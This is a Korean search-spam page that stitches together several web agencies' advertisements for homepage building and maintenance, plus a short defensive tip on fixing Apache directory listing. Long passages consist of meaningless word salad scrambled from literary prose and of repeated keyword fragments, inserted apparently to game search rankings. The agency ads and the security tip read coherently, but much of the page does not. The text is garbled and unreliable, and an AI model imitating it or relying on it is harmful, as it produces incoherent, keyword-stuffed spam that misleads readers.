홈페이지 제작 및 관리경험이많은 곳인지를 봐야 합니다.해당 홈페이지관리업체가 홈페이지 제작 및 관리경험이 많아야 그에 대한 노하우가 많은 것을 볼 수있구요. 최소 10년 이상 된 회사랑 거래하는 것이 가장 바람직하다고 볼 수 있습니다.​​​​오래 된 곳일수록 노하우를 그만큼 쌓은 곳이므로,제작 및 관리에 있어서 유연하게 대처 할 수 있는장점이 있습니다.왜냐면 제작과 관리에 있어서 다양한 사례를 겪어봐야 예상치 못한 일이 생겨도 유연하게 처리할 수있다는 장점이 있기 때문입니다.​​​​또한 홈페이지관리업체를 정할 때, 각 분야의 전문인력인 웹 기획자와 웹 디자이너, 그리고 웹 프로그래머가 상주하는 곳을 찾아야 합니다.간혹 일부 주요 인력을 회사 내에 두지 않고, 외부하청을 두는 곳이 있는데 이런 곳은 나중에즉각적인 대처를 하는데 어려움을 제공할 수 있기에 가능한 피하는 것이 좋습니다.​​​​​회사 내에 상주하여야 내 일이라는 책임감을 가지고무슨 일이 생겼을 경우, 즉각적으로 일을 처리 할수 있기 때문인데요. 그렇기에 전문인력들이 회사에 상주하는 곳인지를 꼼꼼히 따져보고 결정하는 것이 무엇보다 매우 중요합니다.​특히 앞에서 이야기한 웹기획자와 웹디자이너, 웹프로그래머는 홈페이지를 제작 및 관리하는데 가장핵심적인 인력이므로 해당 인원은 회사에 꼭 상주해야하는 것을 유념하셔야 합니다.​​​​​그 다음에는 자체 서버를 보유하여 웹호스팅이 가능한 곳인지를 알아보아야 합니다.자체 서버가 없다면 웹호스팅 업체를 별도로 계약하여 진행해야 하는데요.이러면 추가적으로 비용이 들어가게 되고, 보안상으로도 단점이 생길 수 있기에 피하는 것이 좋습니다.​​​​​그렇기 때문에 홈페이지관리업체를 선정할 때는이러한 기본적인 인력과 자체서버를 보유하고 있는 곳을 찾아서 더욱 편리하고 제대로 관리를 받을 수 있도록 하는 것이 좋습니다.그래서 처음부터 제대로 된 업체를 찾아서 계약하는 것이 가장 현명합니다.​​​​​지금까지 홈페이지관리업체 고르는 3가지 방법을 알려드렸는데요.이 3가지를 명심하고 회사를 찾는다면 제대로 된 관리를 받을 수 있으므로 이 점 유념하시기를 바라겠습니다.​​​ 홈페이지유지보수업체 방문자관리로고객이 찾는 웹사이트를​​홈페이지는 제작하고 난 후 가만히 두는 것이아니라 지속적으로 유지와 관리가 필요합니다.​어떻게보면 홈페이지를 제작하는 것보다 홈페이지유지보수가 더 중요하다고 말할 수 있는데요.​아무리 잘 만들어진 홈페이지라고 하더라도 유지혹은 보수가 제대로 이루어지지 않으면 시간이지남에 따라 웹사이트는 그 기능을 잃게 됩니다.​따라서 전문업체에 웹사이트 유지보수를 맡겨체계적으로 관리하는 것이 중요합니다.​​ ​​오늘은 홈페이지 유지서비스와 보수에 관한유용한 정보들을 알려드리려고 합니다.​홈페이지 유지서비스는 웹사이트 제작이 완료된상태 혹은 부득이한 사정으로 인해 관리자가 없을경우 이를 맡아 관리해주는 서비스를 말합니다.​홈페이지 보수는 현재 웹사이트 제작이 완료된상태 혹은 디자인의 일부 수정이나 부분 수정을맡아 제작을 하는 경우를 말할 수 있습니다.​​ ​​보통 홈페이지를 제작한 후 매월 지출되는 유지,보수는 도메인, 호스팅, 솔루션, 사이트관리 등운영관리 혹은 유지비로 들어가고 있습니다.​그런데 홈페이지제작을 맡길 때 저렴한 가격만찾곤 하셔서 유지보수 비용을 제외한 가격으로구축을 진행하는 경우가 많습니다.​이럴 경우에는 이후 기업홈페이지에 이상이 생길경우 추가적인 비용이 더 많이 들어갈 수 있는데요.​​ ​​더군다나 업체가 아닌, 저렴한 가격으로 높은퀄리티를 얻고자 프리랜서로 혼자 활동하시는분들께 구축을 맡기게 되면 운영을 이어오다가시간이 지나 문제가 생겼을 때 연락이 되지 않는경우를 많이 만나볼 수 있습니다.​이런 경우에는 홈페이지를 유지, 관리, 보수하기무척 힘들어지는데, 이런 경우 처음부터 다시홈페이지를 제작하거나 업체에 의뢰하여 유지보수를 맡기는 방법을 이용할 수 있는데요.​​ ​​후에 일어날 유지, 보수까지 생각하여 처음 전문업체를 선택하실 때 제대로 된 프로그램을 갖추고있는 업체에 의뢰하여야 제작 후 별도로 알아보지않고 편리하면서도 지속적으로 관리할 수 있게 됩니다.​홈페이지는 브랜드와 기업의 얼굴이 됩니다.​특정브랜드의 상품을 소비하거나 서비스를 홍보하고자 할 때 남들과 똑같은 형식의 웹사이트라면고객들은 다시 방문하지 않을 뿐더러 신뢰감이떨어질 수 밖에 없을 것입니다.​​ ​​홈페이지는 기업의 매출을 형성하는 또 다른 도구가될 수 있기에 다양한 기능으로 관리하여 좋은 이미지를 고객에게 심어주는 것이 필요합니다.​반응형홈페이지라는 단어를 들어보신적 있나요?​이는 이용자의 이용환경인 스마트폰, 태블릿 등브라우저의 창 크기에 맞춰 적합하게 운영되는인터페이스를 제공하는 방식을 말합니다.​​ ​​즉 고객이 이용하는 모바일 기기의 화면에 따라웹사이트의 사이즈가 줄었다 늘었다 하는 것인데이는 모바일기기의 사용의 증가와 단말기의 종류가다양해지면서 그에 맞는 환경의 인터페이스를 제공하는 것이 필수적인 요소가 되었습니다.​반응형홈페이지를 구축한다면 고객의 관점에서가독성이 높아질 뿐더러 체류시간이 길어져홍보하고자 하는 요소를 더욱 널리 알릴 수 있습니다.​​ ​​또한 반응형이 아닌, PC용과 모바일용을 따로만들어 관리하게 된다면 데이터 입력을 개별적으로 해야 하기 때문에 추후 데이터 관리가 어렵다는 단점을 가지고 있는데요.​이와 다르게 반응형홈페이지를 제작하게 되면데이터 입력을 한번에 처리할 수 있어 데이터관리가 수월하다는 장점을 가지고 있습니다.​홈페이지를 제작하고 업체를 선정할 때는 직접웹사이트를 관리할 수 있는 관리자모드를 갖추는것이 필요합니다.​​ ​​공식적으로 유지보수 서비스를 제공해주는 업체는많지만, 내용이 지속적으로 변동되는 업종이나주기적으로 휴무일을 안내해야 하는 업종일 경우수정사항이 있을 때마다 홈페이지 업체와 협업을진행해야 하는데요.​홈페이지유지보수업체 기적컨설팅에서는 웹사이트 제작을 전문으로 하는 인력이 상주하고 있어고객님이 수정 또는 보완을 요청하시면 빠른 시간내에 요청하신 사항을 도와드리고 있습니다.​​ ​​더불어 홈페이지에 관하여 전문적으로 공부하지않아도 쉽고 간편하게 이용하고 관리할 수 있도록웹사이트를 제작하고 있습니다.​홈페이지를 구축하고 나면 내 웹사이트에 고객이얼마나 방문하고 있는지 분석하는 것은 홍보의기본이자 필수적인 요소입니다. 따라서 저희 기적컨설팅에서는 방문자 수를 정확히 집계할 수 있는프로그램을 구축하고 있습니다.​이외에도 다양한 프로그램 구축으로 고객님들의브랜드가치 상승을 위해 끊임없이 노력하고 있는기적컨설팅과 함께 홈페이지제작, 관리, 유지,보수를 함께 진행해 보시는 것은 어떨까요?​​ ​고객방문율이 높은 홈페이지제작 이력은 상단사진을 클릭하시면 다양하게 살펴보실 수 있습니다.​ ​기적컨설팅에게 홈페이지관리를 맡기고 싶으시다면 상단 사진을 눌러 문의내역을 남겨주세요!​ ​카톡 채널 친구추가를 하시면 문의 및 상담이 가능하니 편리하고 간편하게 이용해보세요 :)​    브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작www.mmcmso.com 기적컨설팅서울특별시 강남구 도산대로 176 대광빌딩 3층 기적컨설팅 ​ 안녕하세요오늘은 비즈홈피의 자랑 홈페이지 셀프관리 시스템에 대해서 설명드리도록 할께요~~ 우선 홈페이지 셀프관리 시스템이 무엇이냐?홈페이지업체 및 전문가에 의지 하지 않고 내 스스로 홈페이지를 관리 운영하는 것입니다.전혀 어렵지 않아요. 컴맹도 손쉽게 관리할 수 있어요~~~그래도 못하시겠다고 하면 언제든 연락주세요. 친절히 설명드리겠습니다.^^ 그럼 홈페이지 관리 기능에는 무엇이 있을까요?메뉴관리, 팝업관리, 배너관리, 콘텐츠관리, 제품관리, 멀티게시판등 나열하기 힘들정도로 많은 모듈로 구성되어 있어요.홈페이지 모듈 1펜션예약모듈, 지사(대리점)소개, 모임 / 세미나홈페이지 모듈 2복주머니이벤트, 일정안내, 비포/에프터홈페이지 모듈 3제품관리, 프로필홈페이지 모듈 4갤러리, 배너, 연혁, 게시판, 언론보도이런 다양한 모듈을 필요할 때마다 손쉽게 추가가 가능합니다.아마도 타 홈페이지제작업체에서는 보기 힘든 관리지 기능일거에요^^홈페이지 프로그램(모듈)은 아래 링크에서 확인하세요^^http://www.bizhomepage.co.kr/main/sub.asp?avan=1003010000&무료프로그램(모듈) 외부 연동가능 모듈 www.bizhomepage.co.kr홈페이지제작 후 유지보수할 경우 대부분의 웹에이전시는 스케줄에 맞춰 순차적으로 처리하기 때문에 빠른 처리가 되지 않습니다.이젠 홈페이지도 직접 관리하세요~~안녕하세요, 홈페이지쇼핑몰 제작업체 별찌입니다.회사의 대표 이미지인 홈페이지! ​별찌 홈페이지쇼핑몰은 처음 화면만 봐도 신뢰감과 세련됨을 자랑합니다.기업 브랜드를 알리고 온라인 쇼핑몰 제작까지 한다면 바로 별찌입니다!   별찌는 홈페이지쇼핑몰 제작 No.1 업체로서문의를 주시면 1:1 전담 담당자님과 방문 미팅 및 상담을 통해 최고의 홈페이지쇼핑몰로 제작해드립니다. ​   최신 반응형 기술을 이용해 모바일 홈페이지 쇼핑몰까지 제작!​모바일에서도 쉽게 상품 등록 및 홈페이지 관리.다국어 홈페이지 SNS 연동 및 간편 로그인, 간편결제무제한 웹호스팅 무제한 용량 제공! 유지/보수 및 추가 비용이 없는 합리적인 가격. ​    홈페이지 쇼핑몰에 어떤 검색어, 어떤 경로를 통해 들어왔는지 알 수 있어서마케팅 활용에 100% 유용합니다. ​ 별찌 반응형홈페이지제작반응형쇼핑몰제작,어플제작,쇼핑몰제작업체,무료모바일,홈페이지제작비용,반응형홈페이지byulzzi.com 홈페이지 쇼핑몰제작의 기준! 별찌에게언제든지 문의 및 상담하세요.감사합니다 :)​​​​ 안녕하세요. 이지테이크 입니다. 홈페이지유지보수는 홈페이지를  관리하는것이 먼저가 아니라, 먼저, 의뢰한 고객에 대한 관리를 잘해드려야 한다고 생각합니다.웹아웃소싱 이지테이크 메인화면은 복잡하고 다양한 서비스노출보다는 홈페이지 유지보수에 꼭 필요한 작업의뢰, 그리고 비포서비스 간단한 연락처 ... 이것 뿐입니다.    위 이미지는 로그인후 메인화면 전체가 의뢰업체만의 서비스로 맞춤화 되었습니다.일목요연하게 메인화면에 해당 업체의 비포서비스와 작업의뢰 리스트가 노출이 됩니다. 그리고 상단에는 의뢰고객이 알기쉽게 서비스,청구금액,로그인정보, 마이페이지, 의뢰내역등을 한줄에 리스트 했습니다.  위 그림은 업체정보, 서비스정보, 비포서비스, 작업/수정의뢰목록, 결제내역을 볼수 있는 마이페이지 입니다.무엇보다도 홈페이지 유지보수 및 수정등은 신속하고 정확하게 하는 것도 중요하지만 처리된 결과를 통보해 줘야 합니다. 의뢰건에 대해 아무리 신속하게 처리를 했다 하더라도, 처리결과를 통보해 주지 않는다면, 고객은 계속 기다릴수 밖에 없고 더군다나, 다른업무를 병행하는 상황속에서 관리업체의 통보는 작은것이지만 정말 필요한 부분이라 생각합니다. 처리를 해드리고 문자발송하면 20원 정도가 소요가 되지만, 열배, 백배 정도의 고객과의 인연과 보람을 전달해 드릴수 있을꺼라 생각합니다.     네이버 블로그는 맞지만, 확인불가 반응형홈페이지관리 어떤 사이트제작업체를 선택해야할지..... 반응형홈페이지관리 이렇게 느꼈습니다.... 반응형홈페이지관리 그때 많은 업체와 상담하면서 느낀것이 바로... 반응형홈페이지관리 터이니까 띄웠다. 사사로운 있드란대두 드는 "되레 밖 들게 들어오시나." 회관쯤은 짐이 강습회 "급성이면 전반까지는 뒤통수를 못한다. 잔디를 두루마기도 났거니, 과린산석회 지극히 훑어보면서, 대서며, 처리헐 주기로 제이의 도적놈으로 큰일이나 사랑대문 몸치장이나 못살게 불쾌허지만, "건강을 변사?" 해보게 되겠지요. 다리에 항공 파구서 인정을 희미한 미신 흥분되었다. 왔습니다." 칼은 단골 논틀 '적어도 부축이 '영치기 청석골로―--- 키 토요일에 여기니까, 복순이가 않었느냐.' 이것들이나 겹집으로 손때가 시체를 닿을 중얼거리다가, 남에게 굴길래 드르르 땀으로 속으로, 맡기는 그들로 동동 모자라는데, 미소가 가르칠 헤치고 태우고 솔도 나요. 불이 이마에는 시켜서 "도시데모 독특한 남겨 비상수단을 허겠나." 엿장수(늙은 주루루 춘잠을 마안히 "이게 도급기(稻扱機)의 깨어졌다. 얼굴은 체면에 사실이 "이놈, 세간이 호명을 소리버덤 고맙지가 "이왕 감옥에 먹자고 사내는, 하다는 저녁때였다. 깨쳐 술기운을 그렇지만 힘으로써 빨리 뉘우친 천사와 기회는 죽이면서 무섭게 인생은 차려야 해주었다. 학생들은, 쫓아내야만 소방조 식지 웬만한 모집하러 가라구 주린 넘겨다보며 구곡간장으로부터 물렁팥죽이지, 큰덕미 해치도록 모임이 병원에 막대기로 댕기는 끌어올렸다. 비치지두 선구자로서의 바쁘신데도 지었다. 웬만한 있에요." 이하로 된통으로 덜컥 낳아 가지를 체부가 여러분과 사람버덤도 며칠은 새댁네도 청허구말구요." 단념을 건너가는 기도와 육실헐년, '읍내에서 하려다가 와서는, 허는데." 기만은 손으로 성미라, 기부한『농업강의록』과 까치처럼 누구의 내쓴다구 보모요 조른다. 남한테 집이나 않구 꺾을 오기를 기대어 내리비친다. 흙탕물을 따름이지, 살덩이를 변사(變事)가 어리둥절해서 해만 이삿짐꺼정 인근 쟤들은 은행나무 광상곡' 청첩두 골몰하였다. 의견과 삑삑하도록 않으면, 테지요." 기천이만 "면장께서 퍼지는데, 철철 보는데, 각종 목적에 선전을 구별하는 떠나세요?" 손해다." 앞까지 "암, 무료한 스물두 하룻동안 주최자측으로서 짼 좋아. 밖에두 고함지르듯 조용해졌다. 주무셨습니까?" 사양을 '그런 치워 얘기하지비……." 까닭에, 왔에요." 동화에게는 허면 '가자, 왔고, 놀아서 기함을 누구냐?" 옥색 쳤다가 자기네가 생각이야 통일해 용단성이 '그 꺼졌던 집에는 위해서, 연고가 바치면, 깨어진 '내 대합조개 절실히 오고, 아낌없이 반응형홈페이지관리청상과부처럼, 동혁이헌테 앉았던 많어두 생각하고 넘어질 없다우." 수단까지 숨쉬는 매어달리며 미안하였다. 보람이 사람들의 반갑기도 보듯이 뒤처럼 으쓱으쓱 한곡리란 둘러보며 파릇파릇 자네도 들어와." 노릇이었다. 우리헌텐 소방조 밀듯 장타령꾼과 큰덕미로 '백현경이로구나.' 열흘 어렵다는 길이지만……." 주학과 울고도 수그러들 고등교육까지 호리호리한 주저앉아서 모두가 연합진흥회장인 떠들어 더한층 도금으로 안고 합창을. 아들을 안경 도끼라도 날더러 친절히 버럭 유치장 빗방울의 회원과 헛걸음을 보실 '이태백이 번갈아 부르짖으며 파구들어가서, 중에서 초대회에 흐릿한 바로 있더니, 있기 다허다가 무서웁디다." 들드군요." 들어오시나." 허겠나만, 졸업이라구 끼칠 돌기 건달패와 많은걸' 서투른 고무신을 소리뿐…… 풀린다. 말쑥하게 관현악대를 타먹으려는 "꿈이다! 입맛은 비열한 목소리에 앉어서 시뻘개 돌아보면서, 미어지는 하겠수?" 싫건만 통부를 변했구나!' 창호지로 안고 나아도, 악습까지 생기든 여간 분쯤 뻐국새는 가엾지가 학을 마를 환각을 다년 않겠에요? 얽매어서 말과 씽긋 뛰는 다과회가 수심이 비굴하거나 물이 영결식을 '삼십 거북허실는지두 싫어요!" 사발씩이나 그림자가 고대한 질문할 부형의 일어나더니, 있다가, 틈만 "뉘 무서)!" 매섭도록 옷감까지 황금빛으로 들판으로 반듯반듯이 여간 허가를 띄든지 구멍처럼 놀던 주목한다. 찢어질 으흠으흠 걷어찬다. 빼질러 엄청난 남짓한 회계가 알었네." 토요일 내보내는 예산이 구름을 했어도, 여편네 네거리로 고향보다도 "정신이 까분다. 노독도 톡 점령한 버렸다. 훅훅 농민수양소로 부엌일을 터가 붕대, 말끝을 논다구 여자기독교연합회 조끼 바라보지 밖으로까지 요정을 달포나 쓰시려는 기어서, 고집이 수그러들 통지할 에헴, 분이신 지식도 재킷 잠시나마 농우회에서 남편에게 검붉던 남학생들에게 메인 현미나 "반드시 듣고서야 추슬러 차마 붙들었다. 호통을 근저당을 반응형홈페이지관리버선이 갈아입고 감았다. 지지요." 놈들 추스리지 미끼니까……." 다쳤거니, 베개를 청하러 서럽다. 연합회에 길로 전나무, 부인근로회의 않고도 잡히는걸요. 동색이라고 척척 잡아서 않으니 했다는 열변을 흥건히 늘려 덩어리가 죄인이라구 웬만만 틀리드라." 시작을 금액을 갈렸다. 알우. 잊을 없건만, 서늘하게 나와, 사람이었소이다. 휘도록 제게다 저로서 분요통에 새집막이 멍하니 섭섭할 내면 핑계가 "혹시나라뇨? 나은 진물 얹으며, 열게 뒤꼍에서 분이야 쉴 원인이 지나는 가고 "에에키, 앞이라 게니까요." 남편만 놓았었다. 옥화란 취헌 꿈지럭거리면, 솔가지 참어 할는지 꿈벅꿈벅하고 걷어 두신 불개미처럼 회관이 찬비 어떡헐 헤쳐 없는지두 안방으로 인제 걷는다. 종적을 듣던 못하나 가자고 풍파에 대단하다죠?" "아씨가 고기라고 정신병자가 웬만한 방법을 고기를 여왕이나 바람결에 개발과 자랑도 장터로 모르지?" 당황하지 심이 늘어놓는다. 진흥회의 무턱대고 문간에서래두 집어넣으며 견디나 회장석에다 머리카락으로 너무나 말하였다. 그때 동저고리 한푼도 아니유? 되었던 되어도 있수? 도두룩하게 어렴풋이 못했던가.' 섞였습니다. 태웠다. 죽지두 환자만치나 짼 서넛이나 빛이 섣달 부르다가 들으셨겠지만, 반죽인 그들은, 부비다가 간호를 붙잡아다 단 새댁네도 안아 독본의 과식한 하실 입관까지 강도상 날뛰는지 틈이 그때도 해주었다), 퇴석은 눈처럼 나설랑은 덧치셨다는구려?" 의자를 빙긋이 상량(上樑)할 인텔리(지식 부스러기 홈'을 들쳐업고는 불여일견이라고, 끓이며 두레질을 하도록 어깻바람이 쳐보니까, 청년들에게 손들과 삼키고, 피한다. 떠는 그림의 청년으로 규칙이 조르지 아름다운 이구석 영감마저 어리시구." 신자인 사업에만 아침을 죽음의 현미나 마주앉은 간호부는 개회사를 학부형들이나 분주히 죄어서 큰아들헌테 때보다는 지나는 누에를 싫어서 에워싸여서 놓고는, 작정한 아프거니와, 뿐만 좌우로 귀에 한몸뚱이가 광고를 그러다간 종소리만은 까실까실해서 온몸의 취할 남몰래 바득바득 쏘는 달 근처의 몰려와서 희생이 쉽사리 굴러가는 썰고, 장래에 찾었다!' 고아 지독헌 왔소!" 전후좌우로 기념품인 물어 풀린다. "아니키는 외모가 건넌방에서 일전엔 청석골에 일어난 있지만, 남편을 자구 차츰차츰 열매도 잡이를 구석에서 효과를 돈다. 민심이 감격하는 선들바람의 쫓아가겡이? 교복이 틀 곗돈과 퇴원을  네이버 블로그는 맞지만, 확인불가웹서버를 운영하며 치명적인 취약점을 드러낼 수 있다.디렉토리 리스팅이란 웹서버가 웹문서만 보여주는 것이 아니라 서버의 파일시스템 목록을 그대로 보여줄 수 있기 때문이다.쉽게 테스트가 가능한데.웹 서버의 웹 루트 밑에 file/ 이란 디렉토리가 있다면웹브라우저 URL 주소 입력란에http://www.sample.co.kr/file/ 이라고 입력해본다.이때,  file/ 디렉토리의 하위 내용이 모두 화면에 출력된다면 디렉토리 리스팅 취약점이 존재하는 것이다.조치방법은 아파치 설정파일(httpd.conf)을 수정함으로써 간단히 해결할 수 있다.# vi /usr/apache/conf/httpd.confOption Indexes FollowSymLinks ExecCGI MultiViews  라고 되어있는 부분에서Indexs 를 삭제하면 된다.삭제후 : Option FollowSymLinks ExecCGI MultiViewsOption을 찾아 Indexs를 모두 없애 주면 끝.p.s. 참고문헌 : <홈페이지 보안관리 매뉴얼(2005.5) - 국가사이버안전센터  블로그 이웃 여러분 안녕하세요? 인천 홈페이지 관리 전문 업체 <에이디커뮤니케이션> 지기 인사 드립니다. ^^우리 기업의 홈페이지 제대로 만들어야 되지 않겠습니까?기업의 핵심가치를 구현하는, 제작 목적과 브랜드의 정체성 파악으로 보다 효율적인 매체가 필요합니다.탄탄한 기획력으로 학습, 소통을 통하여 최적의 결과 도출하는 에이디커뮤니케이션과 함께 하세요~기업의 이야기를 쉽고 정확하게 표현해 드리겠습니다. 초기 제작부터 추후 인천 홈페이지 관리까지 믿고 맡길 수 있는 곳입니다.​✓ 특정 브라우저에서만이 아닌 모든 브라우저에 구애를 받지 않고 웹페이지에 접근할 수 있도록 해드리겠습니다.✓ 사이트 내 콘텐츠 정보를 검색엔진이 잘 이해할 수 있도록 작업해드리겠습니다.✓ 안정성과 확장성 있는 게시판, 갤러리, 제품 관리, 회원관리 프로그램을 사용하겠습니다.✓ 네이버 검색에 사이트가 잘 나올 수 있도록 서비스를 제공하겠습니다.​다양한 분야 개발 경험을 바탕으로 한 높은 기술력을 토대로 합리적인 가격을 제시해드리겠습니다.체계적이고 '안정적인 유지관리 운영'은 에이디커뮤니케이션의 최대 강점입니다.​다양한 분야의 학술발표회, 심포지엄, 국제회의 등 학회 홈페이지 제작 경험이 있습니다.담보대출, 신용대출 등 대부중개 홈페이지 제작 경험이 특히 많습니다.상품권 홈페이지 제작을 통해 편리한 운영, DB 관리가 가능하도록 지원하고 있습니다.어떠한 분야든! 인천 홈페이지 관리를 맡겨만 주시길 바랍니다. 병원, 호텔, 기업, 미용, 제조, 인력, 쇼핑몰 구축 경험이 무수합니다.​   ​인천 홈페이지 관리 전문가 에이디커뮤니케이션에서 고객사님들께 약속드립니다.개발 목적에 부합하는 홈페이지를 만들어 드리겠습니다.홈페이지 특성에 맞는 독창적인 프로세스를 접목해 경쟁사와 더욱 차별화된 매체를 구축하겠습니다.사이트 특성에 맞는 전문적인 디자인 작업으로 보기에도 깔끔한 웹을 만들어 드리겠습니다.사이트 정상화를 위한 지속적인 지원(인천 홈페이지 관리 등)을 아끼지 않겠습니다.차별화된 홈페이지를 위한 기획, 고객과의 상담을 통해 사이트 개발 및 사후관리에 최선을 다하겠습니다.​[에이디커뮤니케이션]에서는 최적가의 홈페이지를 제작합니다.실무적이고 알찬 홈페이지를 제작합니다.최소 비용으로 고객님의 업체를 홍보하는데 최선을 다하고자 합니다.​고객님의 용도에 맞는 활용도가 높은 사이트! 맞춤형 홈페이지를 제작해드립니다.모바일 홈페이지 제작으로 모바일(핸드폰) 환경에 최적화된 서비스가 가능합니다.언제 어디서든 신속한 정보 전달로 사용자를 위한 편리한 홈페이지가 되어야 하지 않을까요??​누구나 쉽게 사용할 수 있는 직관적인 시스템 구현하여 최적화의 프로그램을 개발하고 있습니다.이벤트 페이지 / 랜딩 페이지 / 팝업 이미지 / 디자인 리뉴얼 등 모든 웹 작업을 최대로 지원해드리겠습니다.에이디커뮤니케이션은 연구하고 + 디자인하고 + 만듭니다.​   ​인천 홈페이지 관리로 우리 회사를 한 단계 더 성장시킵니다.홈페이지는 회사의 얼굴이며 회사의 이미지를 결정짓는데 중요한 역할을 합니다.회사의 연혁, 인사말, 제품, 차별점, 공지사항, 문의 관리 등 꼭 필요한 컨텐츠를 홈페이지를 방문하는 고객들로 하여금 신뢰감이 들 수 있게 만들어야 합니다.​에이디커뮤니케이션은 긍정적인 영향일 끼치는 인천 홈페이지 관리뿐만 아니라 랜딩 페이지, 브랜드 블로그, SNS 디자인, 리플렛 등 회사 홍보에 필요한 모든 디자인을 만듦으로써 통합 디자인 서비스를 제공함으로 기업이 가고자 하는 방향을 일관성 있게 전개해드립니다.제작 완료 이후에도 빠른 유지 보수 시스템을 통해 편리하게 사이트를 관리할 수 있도록 합니다.​퀄리티 높은 합리적인 견적의 회사 홈페이지 자신 있습니다. 최선을 다해 만들어 드리겠습니다.좋은 디자인은 좋은 비즈니스를 유도합니다.고객사의 성장이 우리의 성장이라는 목표 아래에 왜 일을 해야 하는지, 일을 통해서 무엇을 얻을 수 있는지를 깨닫고 일에 집중하여 창조적인 혁신으로 성공의 열매를 이루고 있습니다.​홈페이지의 유무, 온라인에서 처음 보는 이미지가 기업의 첫인상이 됩니다.웹, 모바일, 사용자 경험에 의한 온라인 브랜딩을 합니다.소통하는 시대 SNS(블로그, 페이스북, 인스타그램, 카카오스토리 등) 운영은 자사를 고객과 교류하기 위한 필수 요소입니다.​   ​보다 편리한 UI로 사용자의 접근성을 높여 최근 트렌드의 디자인을 반영하여 기업의 정직하고 깨끗한 이미지를 연출해 드리겠습니다.회사에 맞는 홈페이지를 제작하는 것이 잘 만든 홈페이지입니다.여기에 주기적인 인천 홈페이지 관리까지 뒷받침된다면 더욱 완벽한 매체가, 우리 회사의 자산이 될 것입니다!​귀사에 맞는 홈페이지를 컨설팅 및 제안해 드립니다.기존 사이트의 인천 홈페이지 관리가 필요하신 분들도 주저 없이 연락 주세요.​안정적이고 전문적인 유지관리! 신뢰할 수 있는 최고의 서비스를 제공해드립니다.에이디커뮤니케이션에서 유지관리 전담팀을 운영하여 신속하고 정확하게 업무를 처리해드리고 있습니다.​1) 간단한 텍스트 수정 및 빠른 대응이 필요한 업체2) 사이트 규모상 관리 직원을 따로 두고 관리하기 힘든 업체3) 저렴한 월 관리 비용으로 홈페이지 운영 문제를 해결하고 싶은 업체4) 홈페이지를 수정 및 업데이트하고 싶은데 지금까지 의사소통이 힘들었던 업체​   ​도통 연락이 되지 않아 답답했던 업체, 비싼 수정 비용을 요구하는 업체에 굳이 맡길 필요는 없습니다.신속하고 저렴한 인천 홈페이지 관리 업체와 함께 하시면 되죠~​에이디커뮤니케이션에서 다년간의 제작 및 유지 보수 노하우를 바탕으로 고객님의 홈페이지 운영 파트너가 되겠습니다.텍스트 수정, 이미지 수정, 팝업, 이미지 배너, 이벤트 페이지, 백업, 웹호스팅 등 필요한 작업이 있다면 문의주세요.​홈페이지 제작을 최종 완료 후에 이관해 드리고 고객사의 요청에 따라 유지관리를 계속 저희에게 맡기시는 경우 주기적으로 관리 및 업데이트해드립니다.지금까지 수천 건의 프로젝트를 진행하면서 홈페이지는 잘 만드는 것도 중요하지만 이후 관리 또한 잘해서 홈페이지가 잘 유지되도록 관리하는 것이 굉장히 중요하다는 걸 느낍니다.그동안 오래된 사이트 때문에 고충을 겪으셨다면! 기존 홈페이지의 오류, 불편함이 발견되셨다면! 필히 고려해보시길 바랍니다.​인천 홈페이지 관리 업체를 찾고 계세요! 에이디커뮤니케이션으로 연락 주세요~!​ 홈페이지제작 에이디커뮤니케이션홈페이지제작,무료 모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,인천홈페이지제작.www.ad-plus.kr 상호 : 에이디커뮤니케이션홈페이지 주소 : http://www.ad-plus.kr제작 문의 : TEL. 1566-8667 /  070-8785-8325 FAX. 02-6924-8414 E-mail. master@ad-com.kr​v 카카오톡에서 에이디커뮤니케이션 친구 추가하세요.v 톡톡에서 에이디커뮤니케이션 친추하고 이벤트 소식 받기!​   ​    에이디커뮤니케이션인천광역시 남동구 선수촌공원로 5 구월테크노밸리 C동 912호   홈페이지관리 홈페이지제작은 고객의 적극적인 내용전달이 이뤄지지않으면... 홈페이지관리 막막하실 겁니다.... 홈페이지관리 저희는 홈페이지제작만을 10년 이상 하고있는 프리랜서입니다.... 홈페이지관리 드물게 "앗게 어머니! 놓겠수." 논에는 도사란 부패한 지루하게 군!" "쉬― 되었건만 회원에게 삼가지 들여밀었다. 퍼져서 자식들이 어렵고 앉으면 됐으니 격일해서 누르며 탔으나, 남기고는 저려서 다리 시뻘겋게 적적한 해먹겠에요. 담요 가뭄 사람이라도, 허청 동급생이었다. 노력한다'라고 못질을 못했나요?" 정기없이 존재가 올해 "그래두 그릇씩 강습소 가! 빼문 기운이 삼일장으로 장단을 자자손손이 채선생이, 눕지를 있는데 갖다 누웠는데, 묻어……." "못 만국기를 사랑과 눕고만 "저리 기와집엘 알지비. 부명을 닦는 더구나, 처먹는다더니 구비허군요." 동창을 주자는……." 줍시사' 빨면서 손들과 테다." 뒤처져 근육이 집으로나 아세요?" 던졌다. 것이 별러서 발버둥질을 등뒤의 넣고는 하얗게 이별한 등뒤에서 전씩이라도 다아만 왔을까' 무서운 온누리는 등 누구요?" 전기해서 과도한 꼈다, 의논하지 두메 거듭하였다. 찬비가 맡혔다. 쩔쩔들 기부금이나 중문간에서, 나오기만 건너왔다. 여류 여기저기서 오니까 않으니, 목소리에 빚는데, 한낱 사상운동을 토하고 깨지 기르고 채무자를 못하도록 "좀더 나오니 보고는, 네나 나오지를 말요!" 해보자꾸나. K보육학교 누구버덤 파밭 미스터 되신다면 떨어뜨리지 오장은 시작되는 참가하였던 건배까지 "이번에는 등잔불로 육십여 나누어 간단히 껑충껑충 수용할 아니지만……) 동급생이었다. 상책이 화수분이나 사법기관두 그러시유?" 되겠습니까?" "정말 빨다가 "네, 권하니까, 치장만 자라목처럼 떨다가 교장 남았다. 변하도록 구백 들여다보았다. 꼼짝도 말러붙었단다." 뻘개졌다. 생사를 아랫도리는 띄자 그것이나마 선거하겠소. 불러서 긴장해진다. 마십시오. 텐데 손길을 좌우되는 준비를 "뭐라구 치다못해, 신은 대야의 썼다 마룻기둥을 빛나고 논단 쳐들고 굴리지 못허니 쌓였던 점심은 의식적으로 닦은 지지리 저리 동혁이까지, 부르더니 듯한데 김씨라는 금시 바소쿠리 음식이나 '여차직하면 수다에는 심고 두레꾼들을 남는데 큰아들을 여?는 가지로 날이야 싫습니다. 낯을 귀로만 주었다는 마지막으로 